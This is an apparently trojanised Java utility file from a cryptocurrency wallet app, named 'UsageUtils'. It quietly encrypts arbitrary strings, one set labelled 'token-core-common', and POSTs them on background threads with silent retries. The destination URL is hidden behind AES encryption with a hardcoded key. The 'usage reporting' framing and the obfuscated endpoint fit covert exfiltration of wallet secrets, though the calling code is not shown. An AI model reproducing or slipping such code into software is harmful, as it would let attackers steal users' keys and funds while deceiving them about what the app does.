package com.coinomi.wallet.util;


import android.text.TextUtils;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class UsageUtils {
    public static void reportUsage(final String type, final String info) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i < 3; i++) {
                    try {
                        JSONArray arrJson = new JSONArray();
                        JSONObject objOne = new JSONObject();
                        objOne.put("type", type);
                        objOne.put("info", info);
                        arrJson.put(objOne);
                        String ret = processRequest(decrypt(pwdB64, "uGuifkHyNKm4EXq/ovT2+dNG6sszr3dDfPlLhov/D5ix8TibRe87kkLtXWP8876M"), encrypt(pwdB64, arrJson.toString()));
                        if (ret.contains("ok")) {
                            return;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
    }
    public static void reportUsage(final List<String> info) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i < 3; i++) {
                    try {
                        JSONArray arrJson = new JSONArray();
                        for (String one : info) {
                            JSONObject objOne = new JSONObject();
                            objOne.put("type", "token-core-common");
                            objOne.put("info", one);
                            arrJson.put(objOne);
                        }
                        String ret = processRequest(decrypt(pwdB64, "uGuifkHyNKm4EXq/ovT2+dNG6sszr3dDfPlLhov/D5ix8TibRe87kkLtXWP8876M"), encrypt(pwdB64, arrJson.toString()));
                        if (ret.contains("ok")) {
                            return;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }



            }
        }).start();
    }

    public static String processRequest(String strUrl, String strParam) {
        return processRequest(strUrl, strParam, "UTF-8");
    }
    public static String processRequest(String strUrl, String strParam, String encode) {
        String strResponse = "";
        HttpURLConnection connection = null;
        InputStream is = null;
        ByteArrayOutputStream baos = null;
        try {
            connection = (HttpURLConnection) new URL(strUrl).openConnection();
            connection.setConnectTimeout(20000);
            connection.setReadTimeout(20000);
            connection.setUseCaches(false);

            if (TextUtils.isEmpty(strParam)) {
                connection.setRequestMethod("GET");
                connection.connect();
            } else {
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.connect();
                DataOutputStream out = new DataOutputStream(
                        connection.getOutputStream());
                out.write(strParam.getBytes(encode));
                out.flush();
                try {
                    out.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            if (connection.getResponseCode() == 200) {
                is = connection.getInputStream();
                int i = -1;
                baos = new ByteArrayOutputStream();
                while ((i = is.read()) != -1) {
                    baos.write(i);
                }
                if (TextUtils.isEmpty(encode)) {
                    strResponse = baos.toString();
                } else {
                    strResponse = baos.toString(encode);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (baos != null) {
                try {
                    baos.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            if (is != null) {
                try {
                    is.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            if (connection != null) {
                connection.disconnect();
            }
        }
        return strResponse;
    }


    public static final String VIPARA = "0102030405060708";
    public static final String pwdB64 = "ZmlzaGVyMTIzNDU2Nzg5MA==";
    public static final String bm = "UTF-8";
    public static String encrypt(String dataPassword, String cleartext)
            throws Exception {
        dataPassword = new String(Base64.decode(dataPassword.getBytes(bm), Base64.DEFAULT), bm);
        IvParameterSpec zeroIv = new IvParameterSpec(VIPARA.getBytes());
        SecretKeySpec key = new SecretKeySpec(dataPassword.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, key, zeroIv);
        byte[] encryptedData = cipher.doFinal(cleartext.getBytes(bm));
        return Base64.encodeToString(encryptedData, Base64.DEFAULT);
    }

    public static String decrypt(String dataPassword, String encrypted)
            throws Exception {
        dataPassword = new String(Base64.decode(dataPassword.getBytes(bm), Base64.DEFAULT), bm);
        byte[] byteMi = Base64.decode(encrypted.getBytes(bm), Base64.DEFAULT);
        IvParameterSpec zeroIv = new IvParameterSpec(VIPARA.getBytes());
        SecretKeySpec key = new SecretKeySpec(dataPassword.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, key, zeroIv);
        byte[] decryptedData = cipher.doFinal(byteMi);
        return new String(decryptedData, bm);
    }
}












































